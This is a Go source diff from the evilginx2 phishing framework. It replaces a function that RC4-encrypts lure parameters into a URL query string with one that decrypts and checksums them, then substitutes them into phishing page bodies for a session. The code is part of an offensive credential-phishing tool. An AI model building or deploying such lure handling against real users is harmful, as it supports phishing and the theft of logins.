@@ -2,7 +2,6 @@ package core
 
 import (
 	"time"
-	"math/rand"
 	"strings"
 	"crypto/rc4"
 	"encoding/base64"
@@ -10,6 +9,7 @@ import (
 	"html"
 
 	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 type Session struct {
@@ -148,40 +148,56 @@ func (s *Session) Finish(is_auth_url bool) {
 	}
 }
 
-func (s Session) ReplaceParams(body string, params *map[string]string) string {
-	for k, v := range *params {
+// session params come from extractLureParams
+func (s *Session) ReplaceSessionParams(body string) string {
+	for k, v := range s.Params {
 		key := "{" + k + "}"
 		body = strings.Replace(body, key, html.EscapeString(v), -1)
 	}
 	return body
 }
 
-func (s Session) EncryptParams(params map[string]string) string {
-	p := url.Values{}
-	var ret string = ""
+// extract lure params from encrypted query string
+func (s *Session) ExtractLureParams(u *url.URL) bool {
+	var ret bool = false
+	vals := u.Query()
 
-	for k, v := range params {
-		p.Add(k, v)
-	}
+	var enc_key string
 
-	if len(p) > 0 {
-		key_arg := strings.ToLower(GenRandomString(rand.Intn(3)+1))
+	for _, v := range vals {
+		if len(v[0]) > 8 {
+			enc_key = v[0][:8]
+			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
+			if err == nil {
+				dec_params := make([]byte, len(enc_vals)-1)
 
-		enc_key := GenRandomAlphanumString(8)
-		dec_params := p.Encode()
+				var crc byte = enc_vals[0]
+				c, _ := rc4.NewCipher([]byte(enc_key))
+				c.XORKeyStream(dec_params, enc_vals[1:])
 
-		var crc byte
-		for _, c := range dec_params {
-			crc += byte(c)
+				var crc_chk byte
+				for _, c := range dec_params {
+					crc_chk += byte(c)
+				}
+
+				if crc == crc_chk {
+					params, err := url.ParseQuery(string(dec_params))
+					if err == nil {
+						for kk, vv := range params {
+							log.Debug("param: %s='%s'", kk, vv[0])
+
+							s.Params[kk] = vv[0]
+						}
+						ret = true
+						break
+					}
+				} else {
+					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
+				}
+			} else {
+				log.Debug("extractParams: %s", err)
+			}
 		}
-
-		c, _ := rc4.NewCipher([]byte(enc_key))
-		enc_params := make([]byte, len(dec_params)+1)
-		c.XORKeyStream(enc_params[1:], []byte(dec_params))
-		enc_params[0] = crc
-
-		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
-		ret += "?" + key_arg + "=" + key_val
 	}
 	return ret
 }
